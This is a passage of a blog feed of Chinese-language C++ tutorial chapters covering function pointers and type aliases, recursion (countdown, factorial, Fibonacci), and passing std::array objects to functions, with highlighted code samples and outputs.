class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> diff = operation(<span class="number">10</span>, <span class="number">5</span>); <span class="comment">// 调用 subtract(10, 5)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 - 5 = &quot;</span> &lt;&lt; diff &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 show 指向 display_result 函数</span></span><br><span class="line">    show = display_result;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDisplaying difference using &#x27;show&#x27; pointer:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    show(diff); <span class="comment">// 调用 display_result(diff)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-10-3-深入探讨函数指针"><a href="#7-10-3-深入探讨函数指针" class="headerlink" title="7.10.3 深入探讨函数指针"></a>7.10.3 深入探讨函数指针</h2><p><strong>函数指针作为函数参数:</strong></p><p>一个常见的用途是将函数指针作为参数传递给另一个函数。这允许调用函数根据传入的函数指针来定制其行为。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：检查一个数字是否为偶数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_even</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n % <span class="number">2</span> == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：检查一个数字是否为正数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_positive</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：打印满足特定条件的数字</span></span><br><span class="line"><span class="comment">// 参数：一个整数向量，一个函数指针 (指向检查条件的函数)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_numbers_if</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; numbers, <span class="keyword">bool</span> (*check)(<span class="keyword">int</span>))</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Numbers satisfying the condition: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : numbers) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check(num)) &#123; <span class="comment">// 使用传入的函数指针调用检查函数</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; data = &#123;<span class="number">1</span>, <span class="number">-2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">-5</span>, <span class="number">6</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Checking for even numbers:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    print_numbers_if(data, is_even); <span class="comment">// 传递 is_even 函数的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nChecking for positive numbers:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    print_numbers_if(data, is_positive); <span class="comment">// 传递 is_positive 函数的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Checking for even numbers:</span><br><span class="line">Numbers satisfying the condition: -2 4 6</span><br><span class="line">Checking for positive numbers:</span><br><span class="line">Numbers satisfying the condition: 1 3 4 6</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>print_numbers_if</code> 函数的行为由传递给它的 <code>check</code> 函数指针决定。</p><h2 id="7-10-4-使用-typedef-或-using-进行简化"><a href="#7-10-4-使用-typedef-或-using-进行简化" class="headerlink" title="7.10.4 使用 typedef 或 using 进行简化"></a>7.10.4 使用 typedef 或 using 进行简化</h2><p>函数指针的声明语法可能比较冗长和复杂。可以使用 <code>typedef</code> (传统方式) 或 <code>using</code> (C++11 及以后推荐) 来创建函数指针类型的别名，使代码更清晰。</p><p><strong>使用 <code>typedef</code>:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 typedef 定义函数指针类型别名</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">bool</span> <span class="params">(*CheckFunction)</span><span class="params">(<span class="keyword">int</span>)</span></span>; <span class="comment">// CheckFunction 是指向 (int) -&gt; bool 函数的指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*DisplayFunction)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_if</span><span class="params">(<span class="keyword">int</span> val, CheckFunction check, DisplayFunction display)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (check(val)) &#123;</span><br><span class="line">        display(<span class="string">&quot;Condition met!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        display(<span class="string">&quot;Condition not met.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_negative</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; <span class="keyword">return</span> n &lt; <span class="number">0</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    CheckFunction checker = is_negative; <span class="comment">// 使用别名声明和初始化</span></span><br><span class="line">    DisplayFunction printer = show_message;</span><br><span class="line"></span><br><span class="line">    print_if(<span class="number">-5</span>, checker, printer); <span class="comment">// 输出: Condition met!</span></span><br><span class="line">    print_if(<span class="number">10</span>, checker, printer); <span class="comment">// 输出: Condition not met.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用 <code>using</code> (C++11):</strong></p><p><code>using</code> 提供了更直观、更一致的别名语法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 using 定义函数指针类型别名 (推荐)</span></span><br><span class="line"><span class="keyword">using</span> CheckFunction = <span class="keyword">bool</span> (*)(<span class="keyword">int</span>); <span class="comment">// 指向 (int) -&gt; bool 函数的指针类型</span></span><br><span class="line"><span class="keyword">using</span> DisplayFunction = <span class="keyword">void</span> (*)(<span class="keyword">const</span> <span class="keyword">char</span>*);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (函数 print_if, is_negative, show_message 和 main 函数同上) ...</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_if</span><span class="params">(<span class="keyword">int</span> val, CheckFunction check, DisplayFunction display)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (check(val)) &#123;</span><br><span class="line">        display(<span class="string">&quot;Condition met!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        display(<span class="string">&quot;Condition not met.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_negative</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; <span class="keyword">return</span> n &lt; <span class="number">0</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    CheckFunction checker = is_negative;</span><br><span class="line">    DisplayFunction printer = show_message;</span><br><span class="line"></span><br><span class="line">    print_if(<span class="number">-5</span>, checker, printer);</span><br><span class="line">    print_if(<span class="number">10</span>, checker, printer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用类型别名可以显著提高涉及函数指针的代码的可读性。</p><p><strong>总结:</strong></p><p>函数指针是 C++ 中一个强大的特性，它允许将函数视为数据进行传递和存储。虽然语法可能初看起来有些复杂，但通过 <code>typedef</code> 或 <code>using</code> 可以简化。理解函数指针对于掌握回调机制、某些设计模式以及与 C 库交互非常重要。在现代 C++ 中，函数对象（Functors）和 Lambda 表达式（将在后续章节介绍）提供了更灵活、有时更方便的替代方案，但函数指针仍然有其用武之地。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.9 递归</title>
      <link href="2025/04/26/7.9_%E9%80%92%E5%BD%92/"/>
      <url>2025/04/26/7.9_%E9%80%92%E5%BD%92/</url>
      
        <content type="html"><![CDATA[<p><strong>递归 (Recursion)</strong> 是一种编程技巧，其中函数直接或间接地调用自身来解决问题。递归函数将一个大问题分解为一个或多个与原问题相似但规模更小的子问题，直到问题规模小到可以直接解决（称为<strong>基线条件</strong>或<strong>基本情况</strong>）。</p><p>递归函数通常包含两个关键部分：</p><ol><li> <strong>基线条件 (Base Case):</strong> 一个或多个停止递归的条件。当满足基线条件时，函数不再调用自身，而是返回一个确定的值或执行一个简单的操作。没有基线条件会导致无限递归，最终耗尽内存（栈溢出）。</li><li> <strong>递归步骤 (Recursive Step):</strong> 函数调用自身，但通常使用修改后的参数，使得问题规模向基线条件靠近。</li></ol><h2 id="7-9-1-包含一个递归调用的递归"><a href="#7-9-1-包含一个递归调用的递归" class="headerlink" title="7.9.1 包含一个递归调用的递归"></a>7.9.1 包含一个递归调用的递归</h2><p>这是最简单的递归形式，函数在每次执行时最多调用自身一次。</p><p><strong>示例：使用递归进行倒计时</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归函数：从 n 倒数到 1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">countdown</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 基线条件：当 n 小于等于 0 时，停止递归</span></span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Blastoff!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 递归步骤：打印当前数字，然后调用自身处理 n-1</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        countdown(n - <span class="number">1</span>); <span class="comment">// 函数调用自身，问题规模减小 (n -&gt; n-1)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    countdown(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5...</span><br><span class="line">4...</span><br><span class="line">3...</span><br><span class="line">2...</span><br><span class="line">1...</span><br><span class="line">Blastoff!</span><br></pre></td></tr></table></figure><p><strong>工作原理 (调用栈):</strong></p><ol><li> <code>main</code> 调用 <code>countdown(5)</code>。</li><li> <code>countdown(5)</code> 打印 “5…”，然后调用 <code>countdown(4)</code>。</li><li> <code>countdown(4)</code> 打印 “4…”，然后调用 <code>countdown(3)</code>。</li><li> … 这个过程继续 …</li><li> <code>countdown(1)</code> 打印 “1…”，然后调用 <code>countdown(0)</code>。</li><li> <code>countdown(0)</code> 满足基线条件 (<code>n &lt;= 0</code>)，打印 “Blastoff!” 并返回。</li><li> <code>countdown(1)</code> 返回。</li><li> <code>countdown(2)</code> 返回。</li><li> … 依次回溯 …</li><li><code>countdown(5)</code> 返回到 <code>main</code>。</li></ol><p>每次函数调用都会在称为“调用栈”的内存区域中创建一个新的记录（栈帧），用于存储函数的局部变量和返回地址。当函数返回时，其栈帧被移除。</p><p><strong>示例：使用递归计算阶乘</strong></p><p>阶乘 <code>n!</code> 定义为 <code>n * (n-1) * ... * 1</code>，并且 <code>0! = 1</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归函数：计算 n 的阶乘</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 基线条件：0! = 1</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 递归步骤：n! = n * (n-1)!</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> n * factorial(n - <span class="number">1</span>); <span class="comment">// 函数调用自身</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot;! = &quot;</span> &lt;&lt; factorial(num) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 5! = 120</span></span><br><span class="line">    num = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot;! = &quot;</span> &lt;&lt; factorial(num) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 0! = 1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-9-2-包含多个递归调用的递归"><a href="#7-9-2-包含多个递归调用的递归" class="headerlink" title="7.9.2 包含多个递归调用的递归"></a>7.9.2 包含多个递归调用的递归</h2><p>在这种形式中，函数在一次执行中可能会调用自身多次。这通常用于解决可以分解为多个相同类型子问题的问题，例如树的遍历或某些数学序列的计算。</p><p><strong>示例：使用递归计算斐波那契数列</strong></p><p>斐波那契数列定义如下：<code>F(0) = 0</code>, <code>F(1) = 1</code>, <code>F(n) = F(n-1) + F(n-2)</code> for <code>n &gt; 1</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归函数：计算第 n 个斐波那契数</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">fibonacci</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 基线条件</span></span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 递归步骤：F(n) = F(n-1) + F(n-2)</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 函数调用自身两次</span></span><br><span class="line">        <span class="keyword">return</span> fibonacci(n - <span class="number">1</span>) + fibonacci(n - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> term = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fibonacci(&quot;</span> &lt;&lt; term &lt;&lt; <span class="string">&quot;) = &quot;</span> &lt;&lt; fibonacci(term) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Fibonacci(10) = 55</span></span><br><span class="line"></span><br><span class="line">    term = <span class="number">6</span>;</span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fibonacci(&quot;</span> &lt;&lt; term &lt;&lt; <span class="string">&quot;) = &quot;</span> &lt;&lt; fibonacci(term) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Fibonacci(6) = 8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>工作原理和潜在问题:</strong></p><p>计算 <code>fibonacci(5)</code> 的过程大致如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fibonacci(5)</span><br><span class="line">  -&gt; fibonacci(4) + fibonacci(3)</span><br><span class="line">       -&gt; (fibonacci(3) + fibonacci(2)) + (fibonacci(2) + fibonacci(1))</span><br><span class="line">            -&gt; ((fibonacci(2) + fibonacci(1)) + (fibonacci(1) + fibonacci(0))) + ((fibonacci(1) + fibonacci(0)) + 1)</span><br><span class="line">                 -&gt; (((fibonacci(1) + fibonacci(0)) + 1) + (1 + 0)) + ((1 + 0) + 1)</span><br><span class="line">                      -&gt; (((1 + 0) + 1) + (1 + 0)) + ((1 + 0) + 1)</span><br><span class="line">                      -&gt; ((1 + 1) + 1) + (1 + 1)</span><br><span class="line">                      -&gt; (2 + 1) + 2</span><br><span class="line">                      -&gt; 3 + 2</span><br><span class="line">                      -&gt; 5</span><br></pre></td></tr></table></figure><p>(注意：实际计算 <code>fibonacci(10)</code> 会涉及更多层调用)</p><p>这种包含多个递归调用的实现方式（如此处的斐波那契）虽然直观地反映了数学定义，但效率可能非常低。例如，在计算 <code>fibonacci(5)</code> 时，<code>fibonacci(3)</code> 被计算了两次，<code>fibonacci(2)</code> 被计算了三次。随着 <code>n</code> 的增大，重复计算的次数呈指数级增长。</p><p>对于这类问题，<strong>迭代</strong>（使用循环）或其他优化技术（如<strong>记忆化</strong>，即存储已计算的结果）通常是更高效的解决方案。</p><p><strong>递归的优缺点:</strong></p><ul><li><strong>优点:</strong><ul><li>  对于某些问题（如树遍历、分治算法），递归可以提供非常自然、简洁和易于理解的解决方案。</li><li>  代码可以更接近问题的数学或逻辑描述。</li></ul></li><li><strong>缺点:</strong><ul><li>  可能效率低下，特别是当存在大量重复计算或深度递归时。</li><li>  每次函数调用都有开销（创建栈帧），可能导致性能问题。</li><li>  深度递归可能耗尽调用栈空间，导致栈溢出错误。</li><li>  调试递归函数可能比调试迭代函数更困难。</li></ul></li></ul><p>在选择使用递归还是迭代时，需要权衡代码的清晰度、简洁性与潜在的性能和内存消耗。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.8 函数与 array 对象</title>
      <link href="2025/04/26/7.8_%E5%87%BD%E6%95%B0%E4%B8%8Earray%E5%AF%B9%E8%B1%A1/"/>
      <url>2025/04/26/7.8_%E5%87%BD%E6%95%B0%E4%B8%8Earray%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<p>C++11 引入了 <code>std::array</code> 模板类（在 <code>&lt;array&gt;</code> 头文件中定义），它提供了一种更安全、更方便的方式来表示固定大小的数组。与 C 风格数组会“退化”成指针不同，<code>std::array</code> 对象表现得更像普通的类对象（类似于结构体）。</p><p><strong>关键特性:</strong></p><ul><li>  <code>std::array</code> 封装了一个固定大小的 C 风格数组。</li><li>  其大小是类型信息的一部分（例如 <code>std::array&lt;int, 5&gt;</code> 和 <code>std::array&lt;int, 10&gt;</code> 是不同的类型）。</li><li>  它提供了成员函数（如 <code>size()</code>, <code>at()</code>, <code>front()</code>, <code>back()</code>）和对迭代器的支持。</li><li>  它不会自动退化为指针。</li></ul><h2 id="传递-std-array-对象"><a href="#传递-std-array-对象" class="headerlink" title="传递 std::array 对象"></a>传递 <code>std::array</code> 对象</h2><p>由于 <code>std::array</code> 表现得像一个对象，它默认是<strong>按值传递 (Pass by Value)</strong> 给函数的。这意味着当将一个 <code>array</code> 对象传递给函数时，会创建该对象的完整<strong>副本</strong>。</p><p><strong>示例：按值传递 <code>std::array</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt; // 包含 array 头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt; // 为了 std::accumulate</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个包含 5 个 double 的 array 类型别名</span></span><br><span class="line"><span class="keyword">using</span> FiveDoubles = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, <span class="number">5</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：按值接收 array 对象，计算总和</span></span><br><span class="line"><span class="comment">// arr 是 data 的副本</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">sum_array_value</span><span class="params">(FiveDoubles arr)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function (value): Modifying copy...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">1000.0</span>; <span class="comment">// 修改副本，不影响原始 array</span></span><br><span class="line">    